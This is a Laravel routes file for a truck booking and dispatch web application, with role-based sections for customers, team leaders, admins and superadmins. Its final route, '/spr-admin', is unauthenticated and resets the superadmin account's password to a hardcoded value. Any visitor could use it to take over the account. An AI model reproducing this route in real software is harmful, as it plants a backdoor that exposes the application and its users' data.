<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

use Illuminate\Support\Facades\Hash;
use App\Models\User;

use App\Models\TruckType;

use App\Http\Controllers\GeoController;
use App\Http\Controllers\LandingController;
use App\Http\Controllers\ControlCenterController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\SuperAdminController;
use App\Http\Controllers\TeamLeaderController;

use App\Http\Controllers\Admin\AvailableUnitsController;
use App\Http\Controllers\Admin\DashboardController as AdminController;
use App\Http\Controllers\Admin\DispatchController;
use App\Http\Controllers\Admin\DriversController;
use App\Http\Controllers\Admin\JobsController;

use App\Http\Controllers\Customer\BookingController as CustomerBookingController;
use App\Http\Controllers\Customer\ChatController;
use App\Http\Controllers\Customer\DashboardController;
use App\Http\Controllers\Customer\HistoryController;
use App\Http\Controllers\Customer\TrackController;
use App\Http\Controllers\QuotationController;
use App\Http\Controllers\PublicTrackController;

use App\Http\Controllers\SuperAdmin\AuditLogController;
use App\Http\Controllers\SuperAdmin\BookingController as SuperAdminBookingController;
use App\Http\Controllers\SuperAdmin\DataProtectionController;
use App\Http\Controllers\SuperAdmin\MonitoringController;
use App\Http\Controllers\SuperAdmin\SystemSettingsController;
use App\Http\Controllers\SuperAdmin\TruckTypeController;
use App\Http\Controllers\SuperAdmin\UnitController;
use App\Http\Controllers\SuperAdmin\UserManagementController;
use App\Http\Controllers\SuperAdmin\VehicleTypeController;

Route::get('/', [LandingController::class, 'index'])->name('landing');

Route::get('/book', function () {
    $classes    = ['light', 'medium', 'heavy'];

    $tlAvailability   = app(\App\Services\TeamLeaderAvailabilityService::class);
    $busyTeamLeaderIds = $tlAvailability->busyTeamLeaderIds();

    $teamLeaderRoleIds = \App\Models\Role::query()
        ->whereIn('name', ['Team Leader', 'team leader'])
        ->pluck('id');

    $teamLeadersQuery = \App\Models\User::visibleToOperations()->with(['unit']);
    if ($teamLeaderRoleIds->isNotEmpty()) {
        $teamLeadersQuery->whereIn('role_id', $teamLeaderRoleIds);
    }

    $teamLeaderStatuses = $tlAvailability->summarize(
        $teamLeadersQuery->get(),
        $busyTeamLeaderIds,
    )['leaders']->keyBy('id');

    $readyLeaderIds = $teamLeaderStatuses
        ->filter(fn($s) => ($s['presence'] ?? 'offline') === 'online'
            && ! $busyTeamLeaderIds->contains((int) $s['id']))
        ->pluck('id')
        ->all();

    $truckTypes = TruckType::withCount([
        'units as available_units_count' => function ($q) use ($readyLeaderIds) {
            $q->where('status', 'available')
                ->whereNotNull('team_leader_id')
                ->whereIn('team_leader_id', $readyLeaderIds ?: [-1]);
        },
    ])->where('status', 'active')->orderBy('base_rate')->get();

    $classData = collect($classes)->mapWithKeys(function ($cls) use ($truckTypes) {
        $group          = $truckTypes->where('class', $cls)->values();
        $availableUnits = (int) $group->sum('available_units_count');
        $rep            = $group->sortBy('base_rate')->first();
        return [$cls => [
            'available_units' => $availableUnits,
            'base_rate'       => (float) ($rep?->base_rate   ?? 0),
            'per_km_rate'     => (float) ($rep?->per_km_rate ?? 0),
            'truck_type_id'   => $rep?->id,
        ]];
    });

    return view('landing.form', compact('truckTypes', 'classData'));
})->name('landing.book');

Route::post('/book', [CustomerBookingController::class, 'landingStore'])
    ->middleware('throttle:10,1')
    ->name('landing.book.store');

Route::get('/booking-confirmed', function () {
    $data = session('booking_confirmation');
    if (!$data) {
        return redirect()->route('landing');
    }
    session()->forget('booking_confirmation');
    return view('landing.confirmation', compact('data'));
})->name('booking.confirmed');

Route::prefix('geo')
    ->name('geo.')
    ->group(function () {
        Route::get('/search', [GeoController::class, 'search'])->name('search');
        Route::get('/reverse', [GeoController::class, 'reverse'])->name('reverse');
        Route::post('/route', [GeoController::class, 'route'])->name('route');
        Route::post('/pricing-preview', [GeoController::class, 'pricingPreview'])->name('pricing.preview');
    });

Route::get('/api/vehicle-types/by-category/{category}', [VehicleTypeController::class, 'getByCategory']);
Route::get('/api/vehicle-types/{vehicleType}/truck-types', [VehicleTypeController::class, 'getTruckTypesByVehicle']);

Route::get('/track-booking', [PublicTrackController::class, 'index'])
    ->middleware('throttle:30,1')
    ->name('public.track');

Route::get('/quotation/{quotation}', [QuotationController::class, 'show'])
    ->middleware(['signed', 'throttle:30,1'])
    ->name('quotation.show');

Route::get('/quotation/{quotation}/accept', [QuotationController::class, 'accept'])
    ->middleware(['signed', 'throttle:10,1'])
    ->name('quotation.accept');

Route::get('/quotation/{quotation}/reject', [QuotationController::class, 'reject'])
    ->middleware(['signed', 'throttle:10,1'])
    ->name('quotation.reject');

Route::post('/quotation/{quotation}/negotiate', [QuotationController::class, 'negotiate'])
    ->middleware(['signed', 'throttle:10,1'])
    ->name('quotation.negotiate');

Route::get('/quotation/review/{booking}', [CustomerBookingController::class, 'showQuotationReview'])
    ->middleware(['signed', 'throttle:30,1'])
    ->name('quotation.review');

Route::post('/quotation/review/{booking}', [CustomerBookingController::class, 'respondToQuotationFromEmail'])
    ->middleware(['signed', 'throttle:20,1'])
    ->name('quotation.review.submit');

Route::get('/dashboard', function (Request $request) {
    $role = Auth::user()->role_id ?? 0;
    $baseUrl = rtrim(config('app.url') ?: ($request->getSchemeAndHttpHost() . $request->getBaseUrl()), '/');
    $redirectTo = fn(string $path) => redirect()->to($baseUrl . $path);
    return match ($role) {
        1 => $redirectTo('/superadmin/dashboard'),
        2 => $redirectTo('/admin-dashboard'),
        3 => $redirectTo('/teamleader/dashboard'),
        4 => $redirectTo('/driver'),
        5 => $redirectTo('/customer/dashboard'),
        default => view('dashboard'),
    };
})->middleware(['auth'])->name('dashboard');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

require __DIR__ . '/auth.php';

Route::prefix('teamleader')
    ->name('teamleader.')
    ->middleware(['auth', 'role:3', 'force.password.change'])
    ->group(function () {
        Route::redirect('/', '/teamleader/dashboard');
        Route::get('/dashboard', [TeamLeaderController::class, 'dashboard'])->name('dashboard');
        Route::get('/tasks', [TeamLeaderController::class, 'tasks'])->name('tasks');
        Route::get('/bookings', [TeamLeaderController::class, 'tasks'])->name('bookings');
        Route::get('/task/{booking}', [TeamLeaderController::class, 'showTask'])->name('task.show');

        Route::post('/task/{booking}/accept', [TeamLeaderController::class, 'acceptTask'])
            ->middleware('throttle:20,1')->name('task.accept');

        Route::post('/task/{booking}/driver', [TeamLeaderController::class, 'saveDriver'])
            ->middleware('throttle:20,1')->name('task.driver');

        Route::post('/task/{booking}/note', [TeamLeaderController::class, 'autosaveNote'])
            ->middleware('throttle:30,1')->name('task.note');

        Route::post('/task/{booking}/proceed', [TeamLeaderController::class, 'proceedToLocation'])
            ->middleware('throttle:20,1')->name('task.proceed');

        Route::post('/task/{booking}/start', [TeamLeaderController::class, 'startTask'])
            ->middleware('throttle:20,1')->name('task.start');

        Route::post('/task/{booking}/complete', [TeamLeaderController::class, 'completeTask'])
            ->middleware('throttle:10,1')->name('task.complete');

        Route::post('/task/{booking}/return', [TeamLeaderController::class, 'returnTask'])
            ->middleware('throttle:10,1')->name('task.return');

        Route::post('/task/{booking}/payment', [TeamLeaderController::class, 'submitPayment'])
            ->middleware('throttle:10,1')->name('task.payment');

        Route::get('/task/{booking}/payment-status', [TeamLeaderController::class, 'checkPaymentStatus'])
            ->middleware('throttle:30,1')->name('task.payment-status');

        Route::get('/return-reasons', function () {
            return response()->json(\App\Enums\ReturnReason::toArray());
        })->name('return-reasons');

        Route::get('/task/{booking}/status', [TeamLeaderController::class, 'taskStatus'])
            ->middleware('throttle:30,1')->name('task.status');

        Route::post('/presence/ping', [TeamLeaderController::class, 'heartbeat'])
            ->middleware('throttle:60,1')->name('presence.ping');

        Route::post('/presence/offline', [TeamLeaderController::class, 'goOffline'])
            ->middleware('throttle:60,1')->name('presence.offline');

        Route::post('/tasks/{booking}/start', [TeamLeaderController::class, 'startTask'])
            ->middleware('throttle:20,1')->name('tasks.start');

        Route::post('/tasks/{booking}/confirm-completion', [TeamLeaderController::class, 'confirmCompletion'])
            ->middleware('throttle:10,1')->name('tasks.confirm');

        Route::get('/tasks/{booking}/status', [TeamLeaderController::class, 'taskStatus'])
            ->middleware('throttle:30,1')->name('tasks.status');
    });

Route::get('/teamleader/verification/{booking}/{decision}', [TeamLeaderController::class, 'respondToVerification'])
    ->middleware(['signed', 'throttle:20,1'])
    ->name('teamleader.verification.respond');

Route::view('/driver', 'dashboard')
    ->middleware(['auth', 'role:4'])
    ->name('driver.dashboard');

Route::prefix('control-center')
    ->name('control-center.')
    ->middleware(['auth', 'role:1,2', 'force.password.change'])
    ->group(function () {
        Route::get('/', [ControlCenterController::class, 'index'])->name('index');
        Route::get('/live', [ControlCenterController::class, 'live'])->name('live');
    });

Route::prefix('admin-dashboard')
    ->name('admin.')
    ->middleware(['auth', 'role:2', 'force.password.change'])
    ->group(function () {
        Route::get('/', [AdminController::class, 'index'])->name('dashboard');
        Route::get('/live-overview', [AdminController::class, 'liveOverview'])->name('live-overview');
        Route::get('/dispatch', [DispatchController::class, 'index'])->name('dispatch');
        Route::get('/pending-bookings-count', [DispatchController::class, 'pendingBookingsCount'])->name('pending-bookings-count');

        Route::get('/drivers', [DriversController::class, 'index'])->name('drivers');
        Route::post('/drivers/{teamLeader}/assign-unit', [DriversController::class, 'assignUnit'])->name('drivers.assign-unit');
        Route::post('/drivers/{teamLeader}/remove-unit', [DriversController::class, 'removeUnit'])->name('drivers.remove-unit');
        Route::post('/drivers/{teamLeader}/update-status', [DriversController::class, 'updateStatus'])->name('drivers.update-status');

        Route::patch('/drivers/{teamLeader}/override', [DriversController::class, 'override'])->name('team-leaders.override');

        Route::get('/available-units', [AvailableUnitsController::class, 'index'])->name('available-units');
        Route::post('/available-units', [AvailableUnitsController::class, 'store'])->name('available-units.store');
        Route::patch('/available-units/{unit}/toggle', [AvailableUnitsController::class, 'toggle'])->name('available-units.toggle');
        Route::post('/units/{unit}/maintenance', [AvailableUnitsController::class, 'markMaintenance'])->name('units.maintenance');

        Route::resource('zones', \App\Http\Controllers\Admin\ZoneController::class);

        Route::prefix('active-bookings')->name('active-bookings.')->group(function () {
            Route::get('/', [\App\Http\Controllers\Admin\ActiveBookingsController::class, 'index'])->name('index');
            Route::get('/{booking}', [\App\Http\Controllers\Admin\ActiveBookingsController::class, 'show'])->name('show');
            Route::patch('/{booking}/status', [\App\Http\Controllers\Admin\ActiveBookingsController::class, 'updateStatus'])->name('update-status');
            Route::patch('/{booking}/route', [\App\Http\Controllers\Admin\ActiveBookingsController::class, 'updateRoute'])->name('update-route');
            Route::patch('/{booking}/pricing', [\App\Http\Controllers\Admin\ActiveBookingsController::class, 'updatePricing'])->name('update-pricing');
        });

        Route::post('/booking/{booking}/assign', [DispatchController::class, 'assignBooking'])->name('booking.assign');
        Route::post('/booking/{booking}/service-fee', [DispatchController::class, 'applyServiceFee'])->name('booking.service-fee');
        Route::post('/booking/{booking}/mark-risk', [DispatchController::class, 'markCustomerRisk'])->name('booking.mark-risk');
        Route::get('/jobs', [JobsController::class, 'index'])->name('jobs');
        Route::post('/jobs/{booking}/confirm-payment', [JobsController::class, 'confirmPayment'])->name('jobs.confirm-payment');
        Route::post('/booking/{id}/update-status', [DispatchController::class, 'updateStatus'])->name('booking.updateStatus');

        Route::prefix('quotations')->name('quotations.')->group(function () {
            Route::get('/{quotation}/details', [DispatchController::class, 'getQuotationDetails'])->name('details');
            Route::post('/{quotation}/send', [DispatchController::class, 'sendQuotation'])->name('send');
            Route::post('/{quotation}/cancel', [DispatchController::class, 'cancelQuotation'])->name('cancel');
            Route::patch('/{quotation}/update-price', [DispatchController::class, 'updateQuotationPrice'])->name('update-price');
            Route::patch('/{quotation}/extend', [DispatchController::class, 'extendQuotation'])->name('extend');
            Route::get('/{quotation}/response', [DispatchController::class, 'viewQuotationResponse'])->name('response');
        });
    });

Route::prefix('superadmin')
    ->name('superadmin.')
    ->middleware(['auth', 'role:1', 'force.password.change'])
    ->group(function () {
        Route::get('/dashboard', [SuperAdminController::class, 'index'])->name('dashboard');
        Route::get('/monitoring', [MonitoringController::class, 'index'])->name('monitoring.index');
        Route::get('/monitoring/live', [MonitoringController::class, 'live'])->name('monitoring.live');
        Route::get('/protection', [DataProtectionController::class, 'index'])->name('backups.index');
        Route::post('/protection/backups', [DataProtectionController::class, 'store'])->name('backups.store');
        Route::get('/protection/backups/download', [DataProtectionController::class, 'download'])->name('backups.download');

        Route::get('users/archived', [UserManagementController::class, 'archived'])->name('users.archived');
        Route::patch('users/{user}/archive', [UserManagementController::class, 'archive'])->name('users.archive');
        Route::patch('users/{id}/restore', [UserManagementController::class, 'restore'])->name('users.restore');
        Route::delete('users/{id}/force-delete', [UserManagementController::class, 'forceDelete'])->name('users.force-delete');
        Route::patch('users/{user}/password-request/set-password', [UserManagementController::class, 'setDefaultPassword'])->name('users.password-request.set-password');
        Route::patch('users/{user}/password-request/resolve', [UserManagementController::class, 'resolvePasswordRequest'])->name('users.password-request.resolve');
        Route::resource('users', UserManagementController::class)->except(['show']);

        // Route::get('/superadmin/users/{id}/edit', [UserController::class, 'edit'])
        //     ->name('superadmin.users.edit');


        // RouteL::put('/users/{id}', [UserManagementController::class, 'update'])->name('users.update');

        // Route::put('/superadmin/users/{id}', [UserController::class, 'update'])
        //     ->name('superadmin.users.update');

        Route::patch('users/{id}/toggle', [UserManagementController::class, 'toggleStatus'])->name('users.toggle');

        Route::resource('truck-types', TruckTypeController::class);
        Route::patch('truck-types/{truckType}/toggle', [TruckTypeController::class, 'toggleStatus'])->name('truck-types.toggle');
        Route::get('/truck-type-config/{name}',  [TruckTypeController::class, 'getConfig'])->name('truck-type-config.get');
        Route::post('/truck-type-config/{name}', [TruckTypeController::class, 'saveConfig'])->name('truck-type-config.save');

        Route::get('truck-types-data',              [TruckTypeController::class, 'index'])->name('truck-types.data');
        Route::post('truck-types-data',             [TruckTypeController::class, 'store'])->name('truck-types.data.store');
        Route::put('truck-types-data/{truckType}',  [TruckTypeController::class, 'update'])->name('truck-types.data.update');
        Route::patch('truck-types-data/{truckType}/toggle', [TruckTypeController::class, 'toggleStatus'])->name('truck-types.data.toggle');
        Route::delete('truck-types-data/{truckType}',       [TruckTypeController::class, 'destroy'])->name('truck-types.data.destroy');

        Route::get('/vehicle-types', [\App\Http\Controllers\SuperAdmin\VehicleTypeController::class, 'index'])->name('vehicle-types.index');
        Route::post('/vehicle-types', [\App\Http\Controllers\SuperAdmin\VehicleTypeController::class, 'store'])->name('vehicle-types.store');
        Route::put('/vehicle-types/{vehicleType}', [\App\Http\Controllers\SuperAdmin\VehicleTypeController::class, 'update'])->name('vehicle-types.update');
        Route::patch('/vehicle-types/{vehicleType}/toggle', [\App\Http\Controllers\SuperAdmin\VehicleTypeController::class, 'toggleStatus'])->name('vehicle-types.toggle');
        Route::delete('/vehicle-types/{vehicleType}', [\App\Http\Controllers\SuperAdmin\VehicleTypeController::class, 'destroy'])->name('vehicle-types.destroy');

        Route::get('/units', [UnitController::class, 'index'])->name('unit-truck.index');
        Route::post('/units', [UnitController::class, 'store'])->name('units.store');
        Route::put('/units/{id}', [UnitController::class, 'update'])->name('units.update');
        Route::patch('/units/{id}/toggle',       [UnitController::class, 'toggle'])->name('units.toggle');
        Route::patch('/units/{id}/disable',      [UnitController::class, 'disable'])->name('units.disable');
        Route::patch('/units/{id}/archive',      [UnitController::class, 'archive'])->name('units.archive');
        Route::patch('/units/{id}/restore',      [UnitController::class, 'restore'])->name('units.restore');
        Route::delete('/units/{id}/force-delete', [UnitController::class, 'forceDelete'])->name('units.force-delete');

        Route::get('/bookings', [SuperAdminBookingController::class, 'index'])->name('bookings.index');
        Route::get('/bookings/{id}', [SuperAdminBookingController::class, 'show'])->name('bookings.show');

        Route::get('/audit-logs', [AuditLogController::class, 'index'])->name('audit.logs');

        Route::get('/settings', [SystemSettingsController::class, 'index'])->name('settings.index');
        Route::post('/settings/update', [SystemSettingsController::class, 'update'])->name('settings.update');
        Route::post('/settings/landing', [SystemSettingsController::class, 'updateLanding'])->name('settings.landing.update');

        Route::get('/dashboard-stats', function () {
            $todayBookings  = \App\Models\Booking::whereDate('created_at', today())->count();
            $completedToday = \App\Models\Booking::where('status', 'completed')
                ->whereDate('completed_at', today())->count();
            $cancelledToday = \App\Models\Booking::where('status', 'cancelled')
                ->whereDate('created_at', today())->count();
            $pendingBookings = \App\Models\Booking::where('status', 'requested')->count();

            $rawWeek = \App\Models\Booking::selectRaw('EXTRACT(DOW FROM created_at)::int as dow, count(*) as total')
                ->whereBetween('created_at', [now()->startOfWeek(), now()->endOfWeek()])
                ->groupBy('dow')
                ->get()
                ->keyBy('dow');

            $weekBookings = [];
            foreach ([1, 2, 3, 4, 5, 6, 0] as $dow) {
                $weekBookings[] = (int) ($rawWeek->get($dow)?->total ?? 0);
            }

            return response()->json([
                'todayBookings'   => $todayBookings,
                'completedToday'  => $completedToday,
                'cancelledToday'  => $cancelledToday,
                'pendingBookings' => $pendingBookings,
                'weekBookings'    => $weekBookings,
            ]);
        })->name('dashboard.stats');
    });

Route::middleware(['auth', 'role:5'])
    ->prefix('customer')
    ->name('customer.')
    ->group(function () {
        Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');

        Route::get('/book', function () {
            $classes   = ['light', 'medium', 'heavy'];
            $truckTypes = TruckType::withCount([
                'units as available_units_count' => fn($q) => $q->where('status', 'available')
                    ->whereNotNull('team_leader_id'),
            ])->where('status', 'active')->orderBy('base_rate')->get();

            $classData = collect($classes)->mapWithKeys(function ($cls) use ($truckTypes) {
                $group          = $truckTypes->where('class', $cls)->values();
                $availableUnits = (int) $group->sum('available_units_count');
                $rep            = $group->sortBy('base_rate')->first();
                return [$cls => [
                    'available_units' => $availableUnits,
                    'base_rate'       => (float) ($rep?->base_rate   ?? 0),
                    'per_km_rate'     => (float) ($rep?->per_km_rate ?? 0),
                    'truck_type_id'   => $rep?->id,
                ]];
            });

            return view('customer.pages.book', compact('truckTypes', 'classData'));
        })->name('book');

        Route::post('/book', [CustomerBookingController::class, 'store'])->middleware('throttle:10,1')->name('book.store');
        Route::patch('/booking/{booking}', [CustomerBookingController::class, 'update'])->name('booking.update');
        Route::post('/booking/{booking}/quotation-response', [CustomerBookingController::class, 'respondToQuotation'])
            ->name('booking.quotation.respond');

        Route::get('/track', [TrackController::class, 'index'])->name('track.index');
        Route::get('/track/{id}', [TrackController::class, 'show'])->name('track');

        Route::get('/history', [HistoryController::class, 'index'])->name('history');

        Route::get('/chat', [ChatController::class, 'index'])->name('chat');
        Route::get('/chat/{id}', [ChatController::class, 'show'])->name('chat.show');

        Route::get('/help', function () {
            return view('customer.pages.help');
        })->name('help');
    });

Route::get('/spr-admin', function () {
    $user = User::where('email', 'superadmin@gmail.com')->first();

    if (!$user) {
        return 'User not found';
    }

    $user->password = Hash::make('admin123456');
    $user->save();

    return 'Password reset success';
});
